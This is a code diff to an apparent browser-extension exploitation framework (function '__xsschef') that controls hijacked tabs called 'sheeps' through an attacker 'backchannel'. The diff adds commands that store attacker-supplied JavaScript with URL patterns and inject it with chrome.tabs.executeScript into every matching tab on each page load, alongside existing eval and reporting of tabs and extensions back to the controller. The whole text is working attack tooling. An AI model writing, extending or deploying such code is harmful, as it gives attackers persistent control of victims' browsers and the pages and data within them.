@@ -26,6 +26,8 @@ function __xsschef() {
     window.__xsschef_init = true;
     
     var MY_TAB_ID = -1;
+    
+    var persistentScripts = {};
 
     // these scripts gets executed in sheepchannel tab context, they're written here only for syntax highlighting & easy editing
     // START scripts
@@ -128,6 +130,18 @@ function __xsschef() {
     var backchannel;
     var sheeps = {};
     
+    function runPersistentScripts(tab) {
+        Object.keys(persistentScripts).forEach(function(key) {
+            try {
+                var script = persistentScripts[key];
+                var r = new RegExp(script.urlmatch);
+                if (tab.url.match(r)) {
+                    chrome.tabs.executeScript(tab.id, {'code': script.code});
+                }
+            } catch (e) {}
+        });
+    }
+    
     // when tab has been created/updated
     chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
         if (changeInfo.status == 'complete') {
@@ -139,6 +153,8 @@ function __xsschef() {
             } else {
                 report_tabs();
             }
+
+            runPersistentScripts(tab);
         }
     });
 
@@ -165,7 +181,7 @@ function __xsschef() {
             );
         } catch(e) {
             delete sheeps[tab.id];
-        }    
+        }
     }
     
     function processCommands(msg, port) {
@@ -175,6 +191,7 @@ function __xsschef() {
                 case 'recveval': // from sheeps
                     log({type: msg.cmd, id:port.tab.id, url:port.tab.url, result: msg.p});
                 break;
+                // todo: command to store something from sheep in ext?
                 
                 // all below commands are from backchannel
                 case 'eval':
@@ -218,6 +235,7 @@ function __xsschef() {
                     report_tabs();
                     report_page_info();
                     report_ext();
+                    report_persistent();
                 break;
                 case 'reportpageinfo':
                         postToSheep(msg.id, {cmd: 'sendinfo'});
@@ -245,7 +263,28 @@ function __xsschef() {
                 case 'createtab':
                     chrome.tabs.create({url: msg.p, active: false});
                 break;
-                
+                case 'addpersistent':
+                    // p:{name:"script name",urlmatch: "http://", code: "alert(1)", run_now: false} 
+                    persistentScripts[msg.p.name] = msg.p;
+                    if (msg.p.run_now) {
+                        chrome.tabs.query({}, function(tabs) {
+                            for (var i=0; i<tabs.length;i++) {
+                                runPersistentScripts(tabs[i]);
+                            }
+                        });
+                    }
+                    log("added persistent script " + msg.p.name);
+                    report_persistent();
+                break;
+                case 'removepersistent':
+                    // p: "script name"
+                    delete persistentScripts[msg.p];
+                    log("removed persistent script " + msg.p.name);
+                    report_persistent();
+                break;
+                case 'reportpersistent':
+                    report_persistent();
+                break;
             }
         }
 
@@ -261,9 +300,10 @@ function __xsschef() {
     });
     
     // setup sheepchannel scripts in all tabs (sheeps)
-    chrome.tabs.query({}, function(t2) {
-        for (var i=0; i<t2.length;i++) {
-            addSheep(t2[i]);
+    chrome.tabs.query({}, function(tabs) {
+        for (var i=0; i<tabs.length;i++) {
+            addSheep(tabs[i]);
+            runPersistentScripts(tabs[i]);
         }
     });
     
@@ -367,6 +407,15 @@ function __xsschef() {
         });
     }
     
+    var report_persistent = function() {
+        var clone = [];
+        Object.keys(persistentScripts).forEach(function(key) {
+            clone.push({ name: key, urlmatch: persistentScripts[key].urlmatch });
+        });
+
+        log({type: 'report_persistent', 'result': clone});
+    }
+    
     var postToSheeps = function(msg) {
         for (var i in sheeps) {
             postToSheep(i,msg);
@@ -402,6 +451,7 @@ function __xsschef() {
         log('foothold started');
         report_tabs();
         report_ext();
+        report_persistent();
         if ('__URL__'.match(/^http/)) { // we need to keep the connection alive
             setInterval(function() {
                 log('alive');
